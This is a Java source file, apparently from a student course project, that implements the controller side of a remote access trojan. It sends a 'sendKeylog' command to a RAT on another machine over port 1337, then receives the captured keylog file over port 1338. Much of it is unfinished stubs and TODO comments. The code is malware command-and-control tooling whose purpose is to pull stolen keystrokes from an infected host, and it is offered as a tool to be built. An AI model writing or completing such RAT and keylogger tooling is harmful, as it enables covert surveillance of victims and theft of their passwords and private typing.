package edu.wit.comp2100;

import java.io.*;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

public class Client {

    //class variables
    private String clientName;
    private static int numClients;
    private InetAddress Server_IP; //TODO fix cannot use Inet4Address (get compulation error from Client() constructor
    private InetAddress RAT_IP;
    private boolean isActive;
    private File lastRecievedFile, keyLogFile;
    private final int DEFAULT_PORT = 1337; //TODO decide on default port for rat client

    private Client() throws UnknownHostException {
        /*
        TODO fix cannot use Inet4Address. Inet4Address.getLocalHost() gives us a compilation error.
        InetAddress is a superclass of Inet4Address so it is not compatible.
        How do we get the local machine address in Inet4 format?
         */
        this.Server_IP = InetAddress.getLocalHost(); //TODO handle UnknownHostException
        this.clientName = "Client" + ++numClients; //increment number of clients and name client next number
    }

    Client(InetAddress client_IP) throws UnknownHostException{
        this();
        this.RAT_IP = client_IP;
    }

    /*
    reads input and performs actions
     */
    public void parseCommand(String[] command) throws IOException{

        //make sure arguments provided for "client" command
        try{
            String[] nextPart = breakOffFirstPart(command);
            switch (command[0]){
                case "pull":
                    parsePull(nextPart);
                    break;
                case "test":
                    //TODO implement this
                    break;
                default :
                    System.out.println("ERR: \"" + command[0] + "\" not recognized as a valid client command");
                    break;
            }
        } catch (NegativeArraySizeException n){
            System.out.println("ERR: no arguments provided for command: " + clientName);
            return;
        }

    }

    private void parsePull(String[] command) throws IOException{

        //make sure arguments provided for "client pull" command
        try{
            String[] nextPart = breakOffFirstPart(command);
            switch (command[0]){
                case "keyLog":
                    pullKeylog();
                    System.out.println("Keylog file pulled, stored in Client1.keyLogFile");
                    break;
                default :
                    System.out.println("ERR: \"" + command[0] + "\" not recognized as a valid pull argument");
                    break;
            }
        } catch (NegativeArraySizeException n){
            System.out.println("ERR: no arguments provided for command: pull");
            return;
        }

    }

    private String[] breakOffFirstPart(String[] args){
        //create new array from everything but the first word in the command
        String[] nextPart = new String[args.length -1];
        System.arraycopy(args, 1, nextPart, 0, args.length -1);
        return nextPart;
    }

    /*
    Takes a path as input
    sends request to client for a file (RAT will ask for path and this object will specify)
    wait for response and recieve file.
    set lastRecievedFile as the recieved file,
    return lastRecievedFile.

    If our communication with the RAT times out at any stage, throw an exception and return null.
    our timeout should be about 2-5 seconds waiting for a reply
     */
    public void pullFile(String pathToFile) throws IOException{
        //TODO implement this method
        sendFileRequest();
        recieveFile();
    }

    public void recieveFile()throws IOException{
        String filename = clientName + " KeyLog.txt";

        Socket socket = new Socket(RAT_IP, 1338);
        InputStream inputStream = socket.getInputStream();

        FileOutputStream fileOutputStream = new FileOutputStream(filename);

        byte[] bytes = new byte[1024];
        inputStream.read(bytes, 0, bytes.length);
        fileOutputStream.write(bytes, 0, bytes.length);
        socket.close();
    }


    //right now just sends generic request for keylogger
    private void sendFileRequest(){
        try{
            Socket socket = new Socket(this.RAT_IP, this.DEFAULT_PORT);
            OutputStream outStream = socket.getOutputStream();
            DataOutputStream dataOutStream = new DataOutputStream(outStream);
            dataOutStream.writeUTF("sendKeylog");
            socket.close();
        }catch (IOException io){
            System.err.println("io exception attempting to send request for keyLog.txt");
        }

    }


    public void pullKeylog() throws IOException{
        /*
        TODO: decide - we could do it this way, or this could be an independent method that sends a text
            command and waits for a file after. text command could be something like "pushKeyLog"
         */
        String keylogPath = "keyLog.txt";
        pullFile(keylogPath);
    }

    public String getClientName(){
        return clientName;
    }
    public InetAddress getRAT_IP() {return RAT_IP; }
}
